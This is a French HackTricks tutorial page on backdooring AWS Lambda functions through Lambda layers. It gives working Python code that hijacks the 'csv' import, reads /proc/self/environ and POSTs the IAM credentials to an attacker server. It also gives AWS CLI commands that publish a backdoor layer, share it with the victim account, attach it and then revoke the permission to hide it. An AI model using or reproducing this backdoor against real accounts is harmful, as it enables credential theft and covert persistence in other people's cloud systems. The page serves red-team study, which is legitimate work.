# AWS - Persistance des Couches Lambda

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Couches Lambda

Une couche Lambda est une archive de fichier .zip qui **peut contenir du code suppl√©mentaire** ou d'autres contenus. Une couche peut contenir des biblioth√®ques, un [runtime personnalis√©](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-custom.html), des donn√©es ou des fichiers de configuration.

Il est possible d'inclure jusqu'√† **cinq couches par fonction**. Lorsque vous incluez une couche dans une fonction, le **contenu est extrait dans le r√©pertoire `/opt`** dans l'environnement d'ex√©cution.

Par **d√©faut**, les **couches** que vous cr√©ez sont **priv√©es** √† votre compte AWS. Vous pouvez choisir de **partager** une couche avec d'autres comptes ou de **rendre** la couche **publique**. Si vos fonctions consomment une couche publi√©e par un autre compte, vos fonctions peuvent **continuer √† utiliser la version de la couche apr√®s qu'elle ait √©t√© supprim√©e, ou apr√®s que votre permission d'acc√©der √† la couche ait √©t√© r√©voqu√©e**. Cependant, vous ne pouvez pas cr√©er une nouvelle fonction ou mettre √† jour des fonctions en utilisant une version de couche supprim√©e.

Les fonctions d√©ploy√©es en tant qu'image de conteneur n'utilisent pas de couches. Au lieu de cela, vous emballez votre runtime pr√©f√©r√©, les biblioth√®ques et autres d√©pendances dans l'image du conteneur lorsque vous construisez l'image.

### Chemin de chargement Python

Le chemin de chargement que Python utilisera dans lambda est le suivant :
```
['/var/task', '/opt/python/lib/python3.9/site-packages', '/opt/python', '/var/runtime', '/var/lang/lib/python39.zip', '/var/lang/lib/python3.9', '/var/lang/lib/python3.9/lib-dynload', '/var/lang/lib/python3.9/site-packages', '/opt/python/lib/python3.9/site-packages']
```
V√©rifiez comment les **deuxi√®me** et troisi√®me **positions** sont occup√©es par des r√©pertoires o√π les **couches lambda** d√©compressent leurs fichiers : **`/opt/python/lib/python3.9/site-packages`** et **`/opt/python`**

{% hint style="danger" %}
Si un attaquant parvenait √† **compromettre** une couche lambda utilis√©e ou **√† en ajouter une** qui sera **ex√©cutant du code arbitraire lorsqu'une biblioth√®que commune est charg√©e**, il pourra ex√©cuter du code malveillant √† chaque invocation de lambda.
{% endhint %}

Par cons√©quent, les pr√©requis sont :

* **V√©rifier les biblioth√®ques** qui sont **charg√©es** par le code des victimes
* Cr√©er une **biblioth√®que proxy avec des couches lambda** qui **ex√©cutera du code personnalis√©** et **chargera la biblioth√®que originale**.

### Biblioth√®ques pr√©charg√©es

{% hint style="warning" %}
Lors de l'abus de cette technique, j'ai rencontr√© une difficult√© : Certaines biblioth√®ques sont **d√©j√† charg√©es** dans l'environnement d'ex√©cution python lorsque votre code est ex√©cut√©. Je m'attendais √† trouver des choses comme `os` ou `sys`, mais **m√™me la biblioth√®que `json` √©tait charg√©e**.\
Pour abuser de cette technique de persistance, le code doit **charger une nouvelle biblioth√®que qui n'est pas charg√©e** lorsque le code est ex√©cut√©.
{% endhint %}

Avec un code python comme celui-ci, il est possible d'obtenir la **liste des biblioth√®ques qui sont pr√©charg√©es** √† l'int√©rieur de l'environnement d'ex√©cution python dans lambda :
```python
import sys

def lambda_handler(event, context):
return {
'statusCode': 200,
'body': str(sys.modules.keys())
}
```
Et voici la **liste** (v√©rifiez que des biblioth√®ques comme `os` ou `json` sont d√©j√† pr√©sentes)
```
'sys', 'builtins', '_frozen_importlib', '_imp', '_thread', '_warnings', '_weakref', '_io', 'marshal', 'posix', '_frozen_importlib_external', 'time', 'zipimport', '_codecs', 'codecs', 'encodings.aliases', 'encodings', 'encodings.utf_8', '_signal', 'encodings.latin_1', '_abc', 'abc', 'io', '__main__', '_stat', 'stat', '_collections_abc', 'genericpath', 'posixpath', 'os.path', 'os', '_sitebuiltins', 'pwd', '_locale', '_bootlocale', 'site', 'types', 'enum', '_sre', 'sre_constants', 'sre_parse', 'sre_compile', '_heapq', 'heapq', 'itertools', 'keyword', '_operator', 'operator', 'reprlib', '_collections', 'collections', '_functools', 'functools', 'copyreg', 're', '_json', 'json.scanner', 'json.decoder', 'json.encoder', 'json', 'token', 'tokenize', 'linecache', 'traceback', 'warnings', '_weakrefset', 'weakref', 'collections.abc', '_string', 'string', 'threading', 'atexit', 'logging', 'awslambdaric', 'importlib._bootstrap', 'importlib._bootstrap_external', 'importlib', 'awslambdaric.lambda_context', 'http', 'email', 'email.errors', 'binascii', 'email.quoprimime', '_struct', 'struct', 'base64', 'email.base64mime', 'quopri', 'email.encoders', 'email.charset', 'email.header', 'math', '_bisect', 'bisect', '_random', '_sha512', 'random', '_socket', 'select', 'selectors', 'errno', 'array', 'socket', '_datetime', 'datetime', 'urllib', 'urllib.parse', 'locale', 'calendar', 'email._parseaddr', 'email.utils', 'email._policybase', 'email.feedparser', 'email.parser', 'uu', 'email._encoded_words', 'email.iterators', 'email.message', '_ssl', 'ssl', 'http.client', 'runtime_client', 'numbers', '_decimal', 'decimal', '__future__', 'simplejson.errors', 'simplejson.raw_json', 'simplejson.compat', 'simplejson._speedups', 'simplejson.scanner', 'simplejson.decoder', 'simplejson.encoder', 'simplejson', 'awslambdaric.lambda_runtime_exception', 'awslambdaric.lambda_runtime_marshaller', 'awslambdaric.lambda_runtime_client', 'awslambdaric.bootstrap', 'awslambdaric.__main__', 'lambda_function'
```
Et voici la liste des **biblioth√®ques** que **lambda inclut install√©es par d√©faut** : [https://gist.github.com/gene1wood/4a052f39490fae00e0c3](https://gist.github.com/gene1wood/4a052f39490fae00e0c3)

### D√©tournement de Lambda Layer

Dans cet exemple, supposons que le code cibl√© importe **`csv`**. Nous allons **d√©tourner l'importation de la biblioth√®que `csv`**.

Pour ce faire, nous allons **cr√©er le r√©pertoire csv** avec le fichier **`__init__.py`** √† l'int√©rieur dans un chemin charg√© par lambda : **`/opt/python/lib/python3.9/site-packages`**\
Ensuite, lorsque la lambda est ex√©cut√©e et essaie de charger **csv**, notre fichier **`__init__.py` sera charg√© et ex√©cut√©**.\
Ce fichier doit :

* Ex√©cuter notre charge utile
* Charger la biblioth√®que csv originale

Nous pouvons faire les deux avec :
```python
import sys
from urllib import request

with open("/proc/self/environ", "rb") as file:
url= "https://attacker13123344.com/" #Change this to your server
req = request.Request(url, data=file.read(), method="POST")
response = request.urlopen(req)

# Remove backdoor directory from path to load original library
del_path_dir = "/".join(__file__.split("/")[:-2])
sys.path.remove(del_path_dir)

# Remove backdoored loaded library from sys.modules
del sys.modules[__file__.split("/")[-2]]

# Load original library
import csv as _csv

sys.modules["csv"] = _csv
```
Ensuite, cr√©ez un zip avec ce code dans le chemin **`python/lib/python3.9/site-packages/__init__.py`** et ajoutez-le en tant que couche lambda.

Vous pouvez trouver ce code sur [**https://github.com/carlospolop/LambdaLayerBackdoor**](https://github.com/carlospolop/LambdaLayerBackdoor)

Le payload int√©gr√© **envoie les identifiants IAM √† un serveur LA PREMI√àRE FOIS qu'il est invoqu√© ou APR√àS une r√©initialisation du conteneur lambda** (changement de code ou lambda √† froid), mais **d'autres techniques** telles que les suivantes pourraient √©galement √™tre int√©gr√©es :

{% content-ref url="../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

### Couches Externes

Notez qu'il est possible d'utiliser **des couches lambda de comptes externes**. De plus, une lambda peut utiliser une couche d'un compte externe m√™me si elle n'a pas les permissions.\
Notez √©galement que le **nombre maximum de couches qu'une lambda peut avoir est de 5**.

Par cons√©quent, afin d'am√©liorer la polyvalence de cette technique, un attaquant pourrait :

* Introduire un backdoor dans une couche existante de l'utilisateur (rien n'est externe)
* **Cr√©er** une **couche** dans **son propre compte**, donner **l'acc√®s au compte de la victime** pour utiliser la couche, **configurer** la **couche** dans la Lambda de la victime et **retirer la permission**.
* La **Lambda** pourra toujours **utiliser la couche** et la **victime n'aura** aucun moyen facile de **t√©l√©charger le code de la couche** (√† part obtenir un shell invers√© √† l'int√©rieur de la lambda)
* La victime **ne verra pas les couches externes** utilis√©es avec **`aws lambda list-layers`**

{% code overflow="wrap" %}
```bash
# Upload backdoor layer
aws lambda publish-layer-version --layer-name "ExternalBackdoor" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"

# Give everyone access to the lambda layer
## Put the account number in --principal to give access only to an account
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion

## Add layer to victims Lambda

# Remove permissions
aws lambda remove-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1
```
<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
